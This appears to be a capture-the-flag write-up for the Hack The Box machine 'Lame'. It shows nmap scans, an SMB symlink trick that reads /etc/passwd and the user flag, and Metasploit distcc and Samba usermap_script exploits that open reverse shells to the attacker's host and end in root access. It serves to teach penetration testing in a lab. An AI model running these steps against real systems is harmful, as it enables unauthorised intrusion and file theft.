---
title: Lame
date: 2020-05-31T08:00:28.000+00:00
toc: false
images: 
tags: []

---
Operating System: **Linux**, Difficulty: **Easy**, IP Address: **10.10.10.3**

\* * *

\### Initial Enumeration

1000 Common TCP port scan

    sudo nmap -oN T-common 10.10.10.3

    # Nmap 7.70 scan initiated Tue Jul  2 21:55:24 2019 as: nmap -oN T-common 10.10.10.3

    Nmap scan report for 10.10.10.3

    Host is up (0.23s latency).

    Not shown: 996 filtered ports

    PORT    STATE SERVICE

    21/tcp  open  ftp

    22/tcp  open  ssh

    139/tcp open  netbios-ssn

    445/tcp open  microsoft-ds

    # Nmap done at Tue Jul  2 21:55:38 2019 -- 1 IP address (1 host up) scanned in 13.34 seconds

100% TCP port scan

    sudo nmap -p- -T4 -oN T-all 10.10.10.3

    # Nmap 7.70 scan initiated Tue Jul  2 21:55:36 2019 as: nmap -p- -T4 -oN T-all 10.10.10.3

    Nmap scan report for 10.10.10.3

    Host is up (0.24s latency).

    Not shown: 65530 filtered ports

    PORT     STATE SERVICE

    21/tcp   open  ftp

    22/tcp   open  ssh

    139/tcp  open  netbios-ssn

    445/tcp  open  microsoft-ds

    3632/tcp open  distccd

    # Nmap done at Tue Jul  2 21:59:27 2019 -- 1 IP address (1 host up) scanned in 230.72 seconds

Detailed scan on all the open TCP ports

    sudo nmap -sV -sC -p 21,22,139,445,3632 -oN O-Detailed 10.10.10.3

    # Nmap 7.70 scan initiated Tue Jul  2 22:00:25 2019 as: nmap -sV -sC -p 21,22,139,445,3632 -oN O-Detailed 10.10.10.3

    Nmap scan report for 10.10.10.3

    Host is up (0.24s latency).

    PORT     STATE SERVICE     VERSION

    21/tcp   open  ftp         vsftpd 2.3.4

    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)

    | ftp-syst:

    |   STAT:

    | FTP server status:

    |      Connected to 10.10.14.13

    |      Logged in as ftp

    |      TYPE: ASCII

    |      No session bandwidth limit

    |      Session timeout in seconds is 300

    |      Control connection is plain text

    |      Data connections will be plain text

    |      vsFTPd 2.3.4 - secure, fast, stable

    |_End of status

    22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

    | ssh-hostkey:

    |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)

    |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)

    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

    445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

    3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:

    |_clock-skew: mean: 4h06m55s, deviation: 0s, median: 4h06m55s

    | smb-os-discovery:

    |   OS: Unix (Samba 3.0.20-Debian)

    |   NetBIOS computer name:

    |   Workgroup: WORKGROUP\\x00

    |_  System time: 2019-07-02T12:37:33-04:00

    |_smb2-time: Protocol negotiation failed (SMB2)

    Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/ "https://nmap.org/submit/") .

    # Nmap done at Tue Jul  2 22:01:18 2019 -- 1 IP address (1 host up) scanned in 52.99 seconds

Probable attack vectors

<table>

<thead>

<tr>

<th style="text-align: left;">Service</th>

<th style="text-align: left;">Reason</th>

</tr>

</thead>

<tbody>

<tr>

<td style="text-align: left;">FTP - 21</td>

<td style="text-align: left;">Anonymous login enabled</td>

</tr>

<tr>

<td style="text-align: left;">SMB - 445</td>

<td style="text-align: left;">Samba shares enumeration and old version of samba</td>

</tr>

<tr>

<td style="text-align: left;">DistCCD - 3632</td>

<td style="text-align: left;">An odd service running version 1</td>

</tr>

</tbody>

</table>

FTP file enumeration got me nothing.

    Connected to 10.10.10.3.

    220 (vsFTPd 2.3.4)

    Name (10.10.10.3:jtnydv): Anonymous

    331 Please specify the password.

    Password:

    230 Login successful.

    Remote system type is UNIX.

    Using binary mode to transfer files.

    ftp> ls

    200 PORT command successful. Consider using PASV.

    150 Here comes the directory listing.

    226 Directory send OK.

    ftp> ls -la

    200 PORT command successful. Consider using PASV.

    150 Here comes the directory listing.

    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .

    drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..

    226 Directory send OK.

    ftp>

However the FTP Server vsFTPd 2.3.4 is vulnerable to remote code execution (MSF) as per my initial searchsploit search.

    vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)

However, running this exploit using Metasploit and trying to exploit the vulnerability manually didn't get me a shell.

\### User Own

There are 2 ways to own the user in this box, as per my understanding.

\#### Using SMB

I have read and write access in one of the SMB Shares.

    smbmap -H 10.10.10.3 -u ""

    \[+\] Finding open SMB ports....

    \[+\] User SMB session establishd on 10.10.10.3...

    \[+\] IP: 10.10.10.3:445  Name: 10.10.10.3                                        

            Disk                                                    Permissions

            ----                                                    -----------

            print$                                                  NO ACCESS

            tmp                                                     READ, WRITE

            opt                                                     NO ACCESS

            IPC$                                                    NO ACCESS

            ADMIN$                                                  NO ACCESS

    smbclient \\\\\\\\10.10.10.3\\\\tmp ""

Find all the users on the box

    smb: \\> symlink /etc/passwd pass

    smb: \\> get pass

    cat pass | grep -vi 'false\\|nologin\\|sync'

    root:x:0:0:root:/root:/bin/bash

    daemon:x:1:1:daemon:/usr/sbin:/bin/sh

    bin:x:2:2:bin:/bin:/bin/sh

    sys:x:3:3:sys:/dev:/bin/sh

    games:x:5:60:games:/usr/games:/bin/sh

    man:x:6:12:man:/var/cache/man:/bin/sh

    lp:x:7:7:lp:/var/spool/lpd:/bin/sh

    mail:x:8:8:mail:/var/mail:/bin/sh

    news:x:9:9:news:/var/spool/news:/bin/sh

    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh

    proxy:x:13:13:proxy:/bin:/bin/sh

    www-data:x:33:33:www-data:/var/www:/bin/sh

    backup:x:34:34:backup:/var/backups:/bin/sh

    list:x:38:38:Mailing List Manager:/var/list:/bin/sh

    irc:x:39:39:ircd:/var/run/ircd:/bin/sh

    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh

    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh

    libuuid:x:100:101::/var/lib/libuuid:/bin/sh

    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

    service:x:1002:1002:,,,:/home/service:/bin/bash

    makis:x:1003:1003::/home/makis:/bin/sh

\`makis\` as a user stuck out to me hence I tried making a \`symlink\` to the \`/home/makis/user.txt\` file and own user.

    smb: \\> symlink /home/makis/user.txt user

    smb: \\> ls

      .                                   D        0  Wed Jul  3 10:14:05 2019

      ..                                 DR        0  Mon May 21 00:06:12 2012

      .ICE-unix                          DH        0  Wed Jul  3 10:01:57 2019

      pass                                R     1549  Wed Mar 15 03:46:58 2017

      user                                R       33  Wed Mar 15 01:57:44 2017

      .X11-unix                          DH        0  Wed Jul  3 10:02:34 2019

      5170.jsvc_up                        R        0  Wed Jul  3 10:03:10 2019

      .X0-lock                           HR       11  Wed Jul  3 10:02:34 2019

                    7282168 blocks of size 1024. 5678804 blocks available

    smb: \\> get user

    getting file \\user of size 33 as user (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

As evident from the list of files, we have our user flag \`69454***\`

\#### Using DistCC service

A simple searchsploit search for DistCC got me a metasploit RCE exploit entry \`DistCC Daemon - Command Execution (Metasploit)\`

    msf5 > use exploit/unix/misc/distcc_exec

    msf5 exploit(unix/misc/distcc_exec) > set RHOST 10.10.10.3

    RHOST => 10.10.10.3

    msf5 exploit(unix/misc/distcc_exec) > exploit

    \[*\] Started reverse TCP double handler on 10.10.14.13:4444 

    \[*\] Accepted the first client connection...

    \[*\] Accepted the second client connection...

    \[*\] Command: echo pbbLnvIuNegIZaqi;

    \[*\] Writing to socket A

    \[*\] Writing to socket B

    \[*\] Reading from sockets...

    \[*\] Reading from socket A

    \[*\] A: "sh: line 2: Connected: command not found\\r\\nsh: line 3: Escape: command not found\\r\\n"

    \[*\] Matching...

    \[*\] B is input...

    \[*\] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.3:55417) at 2019-07-03 10:12:30 +0530

    id

    uid=1(daemon) gid=1(daemon) groups=1(daemon)

    cat /home/makis/user.txt

    69454***

Using this method also we can get the user flag from the system, however this is not privileged and can not be leveraged to get root, however, this is a good and stable shell for further enumeration.

\### Root Own

Owning root is a simple process in this box. Run an existing exploit \`Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)\` on the old samba service to get the root shell.

    msf5 > use exploit/multi/samba/usermap_script

    msf5 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3

    RHOST => 10.10.10.3

    msf5 exploit(multi/samba/usermap_script) > exploit

    \[*\] Started reverse TCP double handler on 10.10.14.13:4444 

    \[*\] Accepted the first client connection...

    \[*\] Accepted the second client connection...

    \[*\] Command: echo NohFWWf4R8eYZZsR;

    \[*\] Writing to socket A

    \[*\] Writing to socket B

    \[*\] Reading from sockets...

    \[*\] Reading from socket B

    \[*\] B: "NohFWWf4R8eYZZsR\\r\\n"

    \[*\] Matching...

    \[*\] A is input...

    \[*\] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.3:41230) at 2019-07-03 10:16:23 +0530

    id

    uid=0(root) gid=0(root)

    cat /root/root.txt

    92caa***

\### Takeaway

My personal takeaway from this box was to enumerate all the running services and the their versions first before running into the manual enumeration. While solving this box I completely forgot about running samba service and wasted quite a while enumerating to privilege escalate my way to root using the daemon shell.